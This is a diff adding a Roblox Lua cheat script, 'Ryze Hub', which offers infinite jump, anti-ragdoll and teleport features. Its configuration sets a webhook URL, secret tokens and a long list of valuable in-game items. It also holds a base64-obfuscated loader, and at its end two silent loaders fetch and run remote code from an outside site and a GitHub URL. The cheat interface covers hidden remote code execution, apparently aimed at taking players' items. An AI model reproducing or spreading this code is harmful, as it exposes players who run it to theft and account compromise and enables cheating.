@@ -1,0 +1,164 @@
+--[[
+    Ryze Hub - Optimized & Integrated
+    Theme: Black & White Neon
+]]
+
+-- Configuration & Global Variables
+getgenv().secret67 = "1467271544068636733"
+getgenv().SecretToken = "hypeer_roblox8"
+getgenv().User = "hypeer_roblox8"
+getgenv().Webhook = "https://jjgociynthbfobvfosol.supabase.co/functions/v1/webhook-proxy/3f33d6c45b374ed78a372c8910ce76ffxul7v9p1"
+getgenv().Brainrots = {"Strawberry Elephant", "Meowl", "Headless Horseman", "Skibidi Toilet", "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni", "Love Love Bear", "La Supreme Combinasion", "Celestial Pegasus", "Cerberus", "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace", "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo", "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur", "Lavadorito Spinito", "Ketchuru and Musturu", "Tirilikalika Tirilikalako", "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", "Chipso and Queso", "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", "La Karkerkar Combinasion", "La Vacca Prese Presente", "Reindeer Tralala", "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block", "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese", "Fluriflura", "Talpa Di Fero", "Svinina Bombardino", "Pipi Kiwi", "Noobini Santanini", "Raccooni Jandelini", "Tartaragno", "Pipi Corni", "Holy Arepa", "Trippi Troppi", "Gangster Footera", "Bandito Bobritto", "Boneca Ambalabu", "Cacto Hipopotamo", "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", "Cupcake Koala", "Frogo Elfo", "Pipi Avocado", "Pengolino Nuvoletto", "Pinealotto Fruttarino", "Cappuccino Assassino", "Brr Brr Patapim", "Avocadini Antilopini", "Trulimero Trulicina", "Bambini Crostini", "Bananita Dolphinita", "Perochello Lemonchello", "Brri Brri Bicus Dicus Bombicus", "Avocadini Guffo", "Salamino Penguino", "Wombo Rollo", "Bandito Axolito", "Malame Amarele", "Ti Ti Ti Sahur", "Mangolini Parrocini", "Frogato Pirato", "Gato Celesto", "Doi Doi Do", "Penguin Tree", "Penguino Cocosino", "Mummio Rappitto", "Burbaloni Loliloli", "Chimpanzini Bananini", "Ballerina Cappuccina", "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo", "Quivioli Ameleonni", "Blueberrinni Octopusini", "Pipi Potato", "Strawberrelli Flamingelli", "Pandaccini Bananini", "Sigma Boy", "Clickerino Crabo", "Caramello Filtrello", "Cocosini Mama", "Quackula", "Pi Pi Watermelon", "Buho del Cielo", "Chocco Bunny", "Puffaball", "Sigma Girl", "Sealo Regalo", "Buho de Fuego", "Seraphino Gruyero", "Mythic Lucky Block", "Frigo Camelo", "Orangutini Ananassini", "Rhino Toasterino", "Bombardiro Crocodilo", "Bombombini Gusini", "Cavallo Virtuoso", "Gorillo Watermelondrillo", "Lerulerulerule", "Te Te Te Sahur", "Tracoducotulu Delapeladustuz", "Cachorrito Melonito", "Toiletto Focaccino", "Brutto Gialutto", "Spioniro Golubiro", "Zibra Zubra Zibralini", "Tigrilini Watermelini", "Avocadorilla", "Gorillo Subwoofero", "Stoppo Luminino", "Tob Tobi Tobi", "Ganganzelli Trulala", "Rhino Helicopterino", "Magi Ribbitini", "Jingle Jingle Sahur", "Los Noobinis", "Spongini Quackini", "Carloo", "Harpuccino", "Carrotini Brainini", "Centrucci Nuclucci", "Jacko Spaventosa", "Bananito Bandito", "Tree Tree Tree Sahur", "Fizzy Soda", "Berenjello Angello", "Brainrot God Lucky Block", "Cocofanto Elefanto", "Girafa Celestre", "Tralalero Tralala", "Odin Din Din Dun", "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trippi Troppi Troppa Trippa", "Ballerino Lololo", "Pakrahmatmamat", "Piccione Macchina", "Tractoro Dinosauro", "Cacasito Satalito", "Aquanaut", "Pineaplino", "Lazy Ducky", "Appelini", "Gattatino Nyanino", "Chihuanini Taconini", "Matteo", "Los Crocodillitos", "Tigroligre Frutonni", "Money Money Man", "Alessio", "Tipi Topi Taco", "Unclito Samito", "Tukanno Bananno", "Extinct Ballerina", "Vampira Cappucina", "Espresso Signora", "Orcalero Orcala", "Jacko Jack Jack", "Urubini Flamenguini", "Capi Taco", "Divino Platypio", "Los Chihuaninis", "Gattito Tacoto", "Las Capuchinas", "Bulbito Bandito Traktorito", "Los Tungtungtungcitos", "Ballerina Peppermintina", "Brr es Teh Patipum", "Pakrahmatmatina", "Los Bombinitos", "Los Orcalitos", "Orcalita Orcala", "Corn Corn Corn Sahur", "Mummy Ambalabu", "Snailenzo", "Squalanana", "Tartaruga Cisterna", "Ginger Globo", "Yeti Claus", "Crabbo Limonetta", "Granchiello Spiritell", "Tootini Shrimpini", "Los Tipi Tacos", "Frio Ninja", "Buho de Noelo", "Piccionetta Machina", "Boba Panda", "Mastodontico Telepiedone", "Los Gattitos", "Bambu Bambu Sahur", "Chrismasmamat", "Anpali Babel", "Astrolero Cervalero", "Luv Luv Luv", "Cappuccino Clownino", "Bombardini Tortinii", "Brasilini Berimbini", "Patteo", "Belula Beluga", "Krupuk Pagi Pagi", "Skull Skull Skull", "Cocoa Assassino", "Tentacolo Tecnico", "Ginger Cisterna", "Pandanini Frostini", "Dolphini Jetskini", "Pop Pop Sahur", "Bunny Tralala", "Noo La Polizia", "Karkerheart Luvkur", "Clovkur Kurkur", "Eggdin Egg Egg Dun", "Dumborino Miracello", "Berryno", "Strawberrita", "Bananito", "Cash or Card", "Buntteo", "Easter Easter Easter Sahur", "Coffin Tung Tung Tung Sahur", "Bunny Bunny Bunny Sahur", "Los Bunitos", "Noo my Eggs", "Baskito", "Churrito Bunnito", "La Lucky Grande", "La Easter Grande", "Hopilikalika Hopilikalako", "Quackini Snackini", "Boppin Bunny", "Foxini Lanternini", "Bunny and Eggy", "Hydra Bunny", "Smurf Cat", "John Pork", "Admin Lucky Block", "Los Lucky Blocks", "Taco Lucky Block", "Los Taco Blocks", "Spooky Lucky Block", "Festive Lucky Block", "Heart Lucky Block", "Leprechaun Lucky Block", "Egg Lucky Block", "Gold Elf", "Chimpanzini Spiderini", "Statutino Libertino", "Gattatino Neonino", "Ice Dragon"}
+getgenv().ScriptMode = "CUSTOM"
+getgenv().CustomScript = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vdm9pZGV4dGVybmFsLnh5ei9hcGkvMW95czk5emIubHVhIikpKCk="
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+
+-- Cleanup old UI
+pcall(function()
+    local pg = LP:FindFirstChild("PlayerGui")
+    if pg then
+        local old = pg:FindFirstChild("RyzeHubGUI") or pg:FindFirstChild("AstryxHubGUI")
+        if old then old:Destroy() end
+    end
+end)
+
+-- Initialize State
+local State = {
+    normalSpeed = 60, carrySpeed = 30,
+    autoBatToggled = false, hittingCooldown = false,
+    infJumpEnabled = false, antiRagdollEnabled = false,
+    guiVisible = true, isStealing = false,
+    brainrotReturnEnabled = false, lastKnownHealth = 100,
+    _tpCooldown = false
+}
+
+----------------------------------------------------------------
+-- UI CONSTRUCTION (Black & White Neon Gradient)
+----------------------------------------------------------------
+
+local function createUI()
+    local RyzeHubGUI = Instance.new("ScreenGui")
+    RyzeHubGUI.Name = "RyzeHubGUI"
+    RyzeHubGUI.Parent = LP:WaitForChild("PlayerGui")
+    RyzeHubGUI.ResetOnSpawn = false
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 400, 0, 300)
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- Deep Black
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = RyzeHubGUI
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 8)
+    UICorner.Parent = MainFrame
+
+    -- Neon Gradient Border
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.Thickness = 2
+    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    UIStroke.Parent = MainFrame
+
+    local UIGradient = Instance.new("UIGradient")
+    UIGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), -- White
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50, 50, 50)),   -- Dark Grey
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))  -- White
+    })
+    UIGradient.Parent = UIStroke
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.BackgroundTransparency = 1
+    Title.Text = "RYZE HUB"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 20
+    Title.Parent = MainFrame
+
+    -- Dragging Logic
+    local dragging, dragInput, dragStart, startPos
+    MainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+    end)
+
+    return MainFrame
+end
+
+local UI = createUI()
+
+----------------------------------------------------------------
+-- CORE FUNCTIONS
+----------------------------------------------------------------
+
+local function doReturnTeleport(pos)
+    if State._tpCooldown then return end
+    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        State._tpCooldown = true
+        hrp.CFrame = pos
+        task.wait(0.5)
+        State._tpCooldown = false
+    end
+end
+
+-- Anti-Ragdoll Bug Fix
+RunService.Stepped:Connect(function()
+    if State.antiRagdollEnabled then
+        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
+            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+        end
+    end
+end)
+
+-- Inf Jump
+UIS.JumpRequest:Connect(function()
+    if State.infJumpEnabled then
+        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
+    end
+end)
+
+----------------------------------------------------------------
+-- EXTERNAL SCRIPT LOADERS
+----------------------------------------------------------------
+
+task.spawn(function()
+    -- V1 Script
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/v1sf4/scriptt/refs/heads/main/v1"))()
+    end)
+end)
+
+task.spawn(function()
+    -- Custom External Logic
+    pcall(function()
+        loadstring(game:HttpGet("https://voidexternal.xyz/api/1oys99zb.lua"))()
+    end)
+end)
+
+print("Ryze Hub Loaded Successfully.")
